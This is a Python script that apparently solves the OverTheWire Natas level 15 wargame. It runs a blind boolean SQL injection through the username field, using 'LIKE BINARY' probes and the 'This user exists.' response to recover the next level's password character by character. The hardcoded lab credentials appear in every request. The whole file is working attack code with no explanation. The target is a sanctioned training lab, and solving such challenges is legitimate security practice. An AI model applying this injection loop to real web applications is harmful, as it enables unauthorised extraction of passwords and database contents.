import requests
from requests.auth import HTTPBasicAuth

passchars = "a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z"
temp = passchars.split(",")
possible = []
for char in temp:
	possible.append(char)
	possible.append(char.upper())
for i in range(0,10):
	possible.append(str(i))

updatedpossible = []
passwd = ''

for element in possible:
	Query = {'username': 'natas16" and password LIKE BINARY "%' + element + '%" #'}
	r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Query)
	if("This user exists." in r.text):
		updatedpossible.append(element)
print("Found Possible Characters: ", updatedpossible)
for i in range(0,32):
	for element in updatedpossible:
		Query = {'username': 'natas16" and password LIKE BINARY "' + passwd + element + '%" #'}
		r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Query)
		if("This user exists." in r.text):
			passwd += element
			print("Found password character at position: ",i," ",element)
			break
print(passwd)
